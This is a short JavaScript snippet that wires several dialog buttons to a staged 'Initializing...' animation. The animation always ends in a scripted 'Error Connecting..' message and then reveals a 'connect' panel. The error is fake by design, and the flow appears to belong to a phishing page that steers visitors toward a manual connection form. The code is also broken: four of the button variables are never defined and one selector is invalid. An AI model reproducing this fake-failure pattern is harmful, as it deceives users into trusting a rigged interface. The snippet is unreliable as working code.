
let click_me_btn = document.querySelector("body > div.M2tzjbs > div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0 > div > div > div > div:nth-child(1)")



let first_popup = document.querySelector("body > div.2tzjbs")


click_me_btn.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn2.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn3.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn4.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}
click_me_btn5.onclick = function (e) {
    e.preventDefault();
    loadings();
    closemodal();
    first_popup.style.display = "flex"
}



function loadings() {
    var a =  setTimeout(function () {
        loading.innerHTML = "Initializing.";
      }, 1)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing..";
      }, 500)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
      }, 1000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
      }, 2000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
      }, 3000)

      var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting.."
        connect.style.display = "flex"
      }, 4000)
     
    }
    
